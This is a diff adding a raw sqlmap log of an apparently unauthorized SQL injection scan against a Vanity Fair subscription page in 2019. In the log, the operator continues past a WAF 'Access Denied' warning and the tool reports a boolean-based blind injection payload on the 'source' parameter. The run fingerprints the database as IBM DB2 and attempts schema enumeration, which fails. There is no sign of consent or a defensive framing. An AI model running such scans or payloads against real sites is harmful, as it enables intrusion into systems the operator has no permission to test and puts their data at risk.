@@ -1,0 +1,102 @@
+https://subscribe.vanityfair.com/subscribe/vanityfair/114508?source=CUSTOMERCARE_GIFTLINK
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.3.5.151#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:02:56 /2019-06-02/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[15:02:58] [INFO] testing connection to the target URL
+sqlmap got a 302 redirect to 'https://subscribe.vanityfair.com/subscribe/vanityfair/117293'. Do you want to follow? [Y/n] Y
+[15:03:06] [INFO] checking if the target is protected by some kind of WAF/IPS
+[15:03:07] [INFO] heuristics detected web page charset 'ascii'
+[15:03:07] [CRITICAL] WAF/IPS identified as 'Kona Site Defender (Akamai Technologies)'
+[15:03:07] [WARNING] potential permission problems detected ('Access Denied')
+are you sure that you want to continue with further target testing? [Y/n] Y
+[15:03:07] [WARNING] please consider usage of tamper scripts (option '--tamper')
+[15:03:07] [INFO] testing if the target URL content is stable
+[15:03:15] [WARNING] GET parameter 'source' does not appear to be dynamic
+[15:03:22] [WARNING] heuristic (basic) test shows that GET parameter 'source' might not be injectable
+[15:03:31] [INFO] testing for SQL injection on GET parameter 'source'
+[15:03:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:05:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[15:05:31] [INFO] GET parameter 'source' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
+[15:05:43] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[15:05:43] [INFO] testing 'SQLite inline queries'
+[15:05:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[15:05:43] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[15:05:43] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+[15:05:43] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[15:05:43] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+[15:05:43] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query - comment)'
+[15:05:43] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query - comment)'
+[15:05:43] [INFO] testing 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)'
+[15:05:43] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[15:05:43] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[15:05:48] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[15:05:52] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[15:05:56] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[15:06:00] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[15:06:04] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[15:06:08] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[15:06:12] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[15:06:17] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[15:06:21] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[15:06:25] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[15:06:25] [INFO] checking if the injection point on GET parameter 'source' is a false positive
+GET parameter 'source' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 347 HTTP(s) requests:
+---
+Parameter: source (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: source=-1620' OR 1444=1444-- yIiH
+---
+[15:06:54] [INFO] testing SQLite
+[15:06:55] [WARNING] the back-end DBMS is not SQLite
+[15:06:55] [INFO] testing MySQL
+[15:06:57] [WARNING] the back-end DBMS is not MySQL
+[15:06:57] [INFO] testing Oracle
+[15:06:57] [INFO] confirming Oracle
+[15:06:59] [WARNING] the back-end DBMS is not Oracle
+[15:06:59] [INFO] testing PostgreSQL
+[15:07:01] [WARNING] the back-end DBMS is not PostgreSQL
+[15:07:01] [INFO] testing Microsoft SQL Server
+[15:07:03] [WARNING] the back-end DBMS is not Microsoft SQL Server
+[15:07:03] [INFO] testing Microsoft Access
+[15:07:04] [WARNING] the back-end DBMS is not Microsoft Access
+[15:07:04] [INFO] testing Firebird
+[15:07:05] [INFO] confirming Firebird
+[15:07:07] [WARNING] the back-end DBMS is not Firebird
+[15:07:07] [INFO] testing SAP MaxDB
+[15:07:08] [WARNING] the back-end DBMS is not SAP MaxDB
+[15:07:08] [INFO] testing Sybase
+[15:07:10] [WARNING] the back-end DBMS is not Sybase
+[15:07:10] [INFO] testing IBM DB2
+[15:07:10] [INFO] confirming IBM DB2
+[15:07:11] [INFO] the back-end DBMS is IBM DB2
+web application technology: Apache
+back-end DBMS: IBM DB2
+[15:07:11] [WARNING] schema names are going to be used on IBM DB2 for enumeration as the counterpart to database names on other DBMSes
+[15:07:11] [INFO] fetching database (schema) names
+[15:07:11] [INFO] fetching number of databases
+[15:07:11] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[15:07:11] [INFO] retrieved: 
+[15:07:12] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[15:07:12] [ERROR] unable to retrieve the number of databases
+[15:07:12] [INFO] falling back to current database
+[15:07:12] [INFO] fetching current database
+[15:07:12] [INFO] retrieved: 
+[15:07:36] [WARNING] on IBM DB2 you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
+[15:07:36] [CRITICAL] unable to retrieve the database names
+[15:07:36] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 425 times
+[15:07:36] [INFO] fetched data logged to text files under '/root/.sqlmap/output/subscribe.vanityfair.com'
+
+[*] ending @ 15:07:36 /2019-06-02/
+
